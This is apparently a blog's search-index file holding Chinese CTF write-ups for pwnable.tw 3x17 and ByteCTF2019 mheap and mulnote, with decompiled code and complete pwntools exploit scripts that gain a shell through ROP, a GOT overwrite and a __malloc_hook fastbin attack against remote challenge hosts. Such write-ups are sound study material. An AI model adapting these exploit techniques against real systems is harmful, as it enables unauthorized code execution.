<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>3 x 17</title>
    <url>/2020/09/03/3x17/</url>
    <content><![CDATA[<h1 id="pwnable-tw-gt-3x17"><a href="#pwnable-tw-gt-3x17" class="headerlink" title="pwnable.tw-&gt;3x17"></a>pwnable.tw-&gt;3x17</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做Kidding做不下去看了一眼别人wp自闭了，然后开始做这个分值比较低的新题，自闭++，依然是看着别人wp调的，感觉是纯考动态调试的题，这个题告诉我们不要瞅着代码瞎看，动手找很重要</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序是静态编译的，这意味着代码段的地址是固定的，又是使用ROP的题，这里的函数需要猜一下，其中write和read里进行了系统调用，比较容易识别，strtol()这个搞不懂，不过动态调试的时候可以看到最终的结果是返回输入的数字到rax里，可以猜到是个把字符串转换成整数的函数。程序主要功能是往指定地址写入指定数据</p>
<p><img src="/2020/09/03/3x17/1.jpg" alt="main"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序本身就是任意地址写了，漏洞比较明显，重点在于这一次的覆写如何进行，我以前做的类似的题是直接patch掉if成loop多次覆写最终拿到flag，不过那个偏逆向，这里main的代码段是不可写的只得作罢，之后去看wp发现了一个新的东西叫做.fini_arrary,是程序执行完毕之后执行的函数，这个数组里存着两个函数地址，根据<br><a href="https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html" target="_blank" rel="noopener">reference</a>，有以下的关键信息</p>
<blockquote>
<p>The runtime linker executes functions whose addresses are contained in the .fini_array section. These functions are executed in the reverse order in which their addresses appear in the array. The runtime linker executes a .fini section as an individual function. If an object contains both .fini and .fini_array sections, the functions defined by the .fini_array section are processed before the .fini section for that object.</p>
</blockquote>
<p>也就是说这个数组的两个函数以倒序依次被执行，我们可以通过覆写.fini_array的内容来控制执行流，根据这个数组的调用，可以找到实际调用函数的位置，这个函数位于0x402960，这里调用的是[rbp+rbx*8]，调用地址为0x402988，我们不妨直接Gdb断点下在此处看看调用的是什么结果。</p>
<p><img src="/2020/09/03/3x17/2.jpg" alt="call_fini_array"></p>
<p>可以看到在调用前rbx为1，rbp为0x4b40f0即.fini_array，即调用arr[1]，继续调试，可以看到rbx变为0之后和-1比较cmp不相等，因此再次执行call [rbp+rbx*8]，即调用arr[0]，刚好符合我们之前查到的资料。我们第一次覆写的目的是构造一个类似while的闭环，使得我们可以无限次写入，若只是覆写其中一个为main，则只能覆写一次，执行完Main之后就GG。因此我们的初步想法是把arr[1]改为main_addr，arr[0]改为一个调用调用函数的函数地址(0x402960)，这样的效果就是调用arr[1]进了main，调用arr[0]又进了调用arr[1]和arr[0]的函数，继续调用main，继续调用0x402960继而调用main…而当我们完成rop的时候，只需要修改arr[0]为rop的起始地址，就可以调用它完成getshell。</p>
<p><img src="/2020/09/03/3x17/3.jpg" alt="0x402988"></p>
<h3 id="ROP的布置"><a href="#ROP的布置" class="headerlink" title="ROP的布置"></a>ROP的布置</h3><p>ROP并不像以前那样布置在栈上依次执行，我们的数据需要通过pop_register之类的命令从栈上获取到寄存器里，因此我们需要知道rsp、rbp的情况，这里又得动态去调试。我们先不布置rop，arr[1]为main_addr,arr[0]为leave_ret_adddr(0x401c4b)。断点下在0x401c4b。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call [rbp]</span><br><span class="line">//rsp = ?,rbp = 0x4b40f0</span><br><span class="line">leave</span><br><span class="line">(mov rsp,rbp;</span><br><span class="line">//rsp = 0x4b40f0 = rbp</span><br><span class="line">pop rbp)</span><br><span class="line">//rsp = 0x4b40f8, rbp = 0x401c4b(leave_ret_addr)</span><br><span class="line">ret(to 0x401b6d,main_addr)</span><br><span class="line">//rsp = 0x4b4100, rbp = 0x401c4b</span><br><span class="line">push rbp;</span><br><span class="line">//rsp = 0x4b40f8, rbp = 0x401c4b</span><br><span class="line">mov rbp, rsp;</span><br><span class="line">// rbp = rsp = 0x4b40f8</span><br><span class="line">....</span><br><span class="line">// rsp = 0x4b40c8, rbp = 0x4b40f8</span><br><span class="line">mov rsp, rbp;</span><br><span class="line">// rsp = 0x4b40f8 = rbp</span><br><span class="line">pop rbp;</span><br><span class="line">// rsp = 0x4b4100, rbp = 0x401c4b</span><br><span class="line">ret(to 0x4b4100)</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/09/03/3x17/4.jpg" alt="leave_ret"></p>
<p><img src="/2020/09/03/3x17/5.jpg" alt="final_stack"></p>
<p>也就是说最后操作完毕，rsp = rip = 0x4b4100, rbp = 0x401c4b。我们需要修改的就是0x4b4100的内容，布置ROP链，最后让arr[0]为leave_ret_addr即可。注意此时rsp和rip一样，因此可以直接当成栈里的情况布置ROP,一个pop_ret跟一个参数即可。</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./317'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x401c29')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p =remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'addr:'</span>)</span><br><span class="line">    p.sendline(str(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    fini_arr_addr = <span class="number">0x4b40f0</span></span><br><span class="line">    main_addr = <span class="number">0x401b6d</span></span><br><span class="line">    loop_func_addr = <span class="number">0x402960</span></span><br><span class="line">    leave_ret_addr = <span class="number">0x401c4b</span></span><br><span class="line">    send_data(fini_arr_addr, p64(loop_func_addr)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#rop chain</span></span><br><span class="line">    pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">    pop_rdi = <span class="number">0x401696</span></span><br><span class="line">    pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">    pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">    syscall_addr = <span class="number">0x471db5</span></span><br><span class="line">    start_addr = <span class="number">0x4b4100</span></span><br><span class="line">    binsh_addr = <span class="number">0x4B4080</span></span><br><span class="line">    send_data(start_addr,p64(pop_rax)+p64(<span class="number">59</span>))</span><br><span class="line">    send_data(binsh_addr,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    send_data(start_addr+<span class="number">16</span>,p64(pop_rdi)+p64(binsh_addr))</span><br><span class="line">    send_data(start_addr+<span class="number">32</span>,p64(pop_rsi)+p64(<span class="number">0</span>))</span><br><span class="line">    send_data(start_addr+<span class="number">48</span>,p64(pop_rdx)+p64(<span class="number">0</span>))</span><br><span class="line">    send_data(start_addr+<span class="number">64</span>,p64(syscall_addr))</span><br><span class="line">    <span class="comment">#trigger rop</span></span><br><span class="line">    send_data(fini_arr_addr,p64(leave_ret_addr))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>ByteCTF2019</title>
    <url>/2020/09/03/ByteCTF2019/</url>
    <content><![CDATA[<h1 id="ByteCTF2019-PWN-部分writeup"><a href="#ByteCTF2019-PWN-部分writeup" class="headerlink" title="ByteCTF2019 PWN 部分writeup"></a>ByteCTF2019 PWN 部分writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是七哥最后一场线上赛，看七哥姚老板P1umer日天日地日虚拟机日浏览器感觉自己差的太多了，要更努力。</p>
<h2 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h2><h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序是自己实现的malloc和free，有alloc、show、free、edit等四个功能，自己分析半天没找到漏洞，看了wp才晓得。</p>
<p>alloc不限制输入的size，输入一个非负的size，首先0x10对齐，之后加上0x10的chunk头。自定义的chunk_addr[0]为其size，chunk_addr[1]为上一个释放的堆块地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">Alloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Input size: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">    qword_4040E0[idx] = MyAlloc(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content: "</span>, &amp;size);</span><br><span class="line">    get_input(qword_4040E0[idx], size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_QWORD *__fastcall <span class="title">MyAlloc</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">int</span> final_size; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> chunk_size; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">  _QWORD *chunk_addr; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  final_size = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size &amp; <span class="number">0xF</span> )</span><br><span class="line">    final_size = size + <span class="number">16</span> - (size &amp; <span class="number">0xF</span>);      <span class="comment">// 0x10对齐，向上取整</span></span><br><span class="line">  chunk_size = final_size + <span class="number">16</span>;</span><br><span class="line">  chunk_addr = MyMalloc(chunk_size);            <span class="comment">// 0x10的chunk头</span></span><br><span class="line">  <span class="keyword">if</span> ( chunk_addr )</span><br><span class="line">    <span class="keyword">return</span> chunk_addr + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( qword_4040C0 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v2 = (_QWORD *)qword_4040C8;</span><br><span class="line">  qword_4040C8 += chunk_size;</span><br><span class="line">  qword_4040C0 -= chunk_size;</span><br><span class="line">  *v2 = chunk_size;</span><br><span class="line">  <span class="keyword">return</span> v2 + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_QWORD *__fastcall <span class="title">MyMalloc</span><span class="params">(<span class="keyword">int</span> chunk_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v2; <span class="comment">// [rsp+4h] [rbp-10h]</span></span><br><span class="line">  _QWORD *i; <span class="comment">// [rsp+Ch] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (_QWORD *)qword_4040D0;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4040D0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_QWORD *)qword_4040D0 &amp; <span class="number">0xFFFFFFFF0</span>LL) == chunk_size )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_4040D0 = *(_QWORD *)(qword_4040D0 + <span class="number">8</span>);<span class="comment">// fast bin</span></span><br><span class="line">    result = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = *(_QWORD **)(qword_4040D0 + <span class="number">8</span>); i; i = (_QWORD *)i[<span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (*i &amp; <span class="number">0xFFFFFFFF0</span>LL) == chunk_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v2[<span class="number">1</span>] = i[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = i;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Free函数将释放堆块的chunk[1]处改为上一个释放堆块的地址，0x4040d0处填入此堆块的地址，类似实现fastbin的链表结构。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Free</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 chunk_addr; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_addr = qword_4040E0[idx];</span><br><span class="line">    <span class="keyword">if</span> ( chunk_addr )</span><br><span class="line">    &#123;</span><br><span class="line">      MyFree(qword_4040E0[idx]);</span><br><span class="line">      qword_4040E0[idx] = <span class="number">0L</span>L;</span><br><span class="line">      LODWORD(chunk_addr) = <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> chunk_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">MyFree</span><span class="params">(__int64 chunk_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)(chunk_addr - <span class="number">16</span> + <span class="number">8</span>) = qword_4040D0;</span><br><span class="line">  result = chunk_addr - <span class="number">16</span>;</span><br><span class="line">  qword_4040D0 = chunk_addr - <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Edit可以编辑0x10字节的堆块，Show可以打印堆块内容。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞出现在get_input函数，read函数向ptr+count处写数据，一旦我们分配的size大于add的总和(超过0x1000的边界)，read写边界之后的数据是非法的，因此会返回-1。这里返回值的判断出了问题，此时会绕过判断，count–，变成-1，现在向ptr-1处写，依然会写到边界后的数据，因此依然写入失败，返回-1，再继续后向尝试…，一直到遇到换行符结束寻找退出（注意此时还是写入了数据，只是不够我们要求的数据长度，提前结束了read的后向寻址），或者一直没遇到换行符，找到一个足够容纳数据长度的地址开始写。利用这个漏洞我们可以后向修改一个释放chunk的chunk[1]，为0x4040e0，之后再分配一个相同大小的chunk就会把这个chunk分配掉，0x4040d0处写入0x4040e0，之后再分配一个0x2333000的chunk，程序会从0x4040e0开始找，找一个size部分合适的堆块分配，而0x4040e0的size位置正合适，因此分配这个块，可以覆写0x4040f0处即chunk_list[2]为atoi_got，Show泄露libc，Edit改成system函数，之后atoi(“/bin/sh\x00”)拿shell。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_input</span><span class="params">(__int64 ptr, <span class="keyword">signed</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> read_bytes; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)count;</span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read_bytes = read(<span class="number">0</span>, (<span class="keyword">void</span> *)(ptr + count), size - count);</span><br><span class="line">    <span class="keyword">if</span> ( !read_bytes )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    count += read_bytes;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> __int8 *)(count - <span class="number">1L</span>L + ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)result != <span class="string">'\n'</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4040d0:       0x00000000004040e0      0x0000000000000000</span><br><span class="line">0x4040e0:       0x0000000023330010      0x0000000023330f20</span><br><span class="line">0x4040f0:       0x0000000023330f90      0x0000000000000000</span><br><span class="line">0x404100:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./mheap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./mheap'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'49.232.101.194'</span>,<span class="number">54337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size &gt;= <span class="number">0</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    Alloc(<span class="number">0</span>,<span class="number">0xf00</span>,<span class="string">"a\n"</span>)</span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">"a"</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">2</span>,<span class="number">0x100</span>,p64(<span class="number">0x70</span>)+p64(<span class="number">0x4040e0</span>)+<span class="string">"x"</span>*(<span class="number">0xe0</span><span class="number">-1</span>)+<span class="string">"\n"</span>)</span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">"a"</span>+<span class="string">"\n"</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Alloc(<span class="number">2</span>,<span class="number">0x23330000</span>,p64(<span class="number">0x404050</span>)+<span class="string">"\n"</span>)</span><br><span class="line">    Show(<span class="number">2</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))-(<span class="number">0x7f3fddc82680</span><span class="number">-0x7f3fddc42000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">    Edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    <span class="comment">#p.recvuntil("choice: ")</span></span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>free之后10s才清空，UAF</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./mulnote'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./mulnote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'C'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size&gt;"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"note&gt;"</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'E'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index&gt;"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'new note&gt;'</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'R'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index&gt;"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Create(<span class="number">0x88</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    Remove(<span class="number">0</span>)</span><br><span class="line">    Show()</span><br><span class="line">    p.recvuntil(<span class="string">"[*]note[0]:\n"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-3951480</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fake_chunk = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Remove(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Remove(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#Show()</span></span><br><span class="line"></span><br><span class="line">    Remove(<span class="number">0</span>)</span><br><span class="line">    Create(<span class="number">0x68</span>,p64(fake_chunk))<span class="comment">#0</span></span><br><span class="line">    Create(<span class="number">0x68</span>,p64(fake_chunk))<span class="comment">#1</span></span><br><span class="line">    Create(<span class="number">0x68</span>,p64(fake_chunk))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'C'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"17"</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
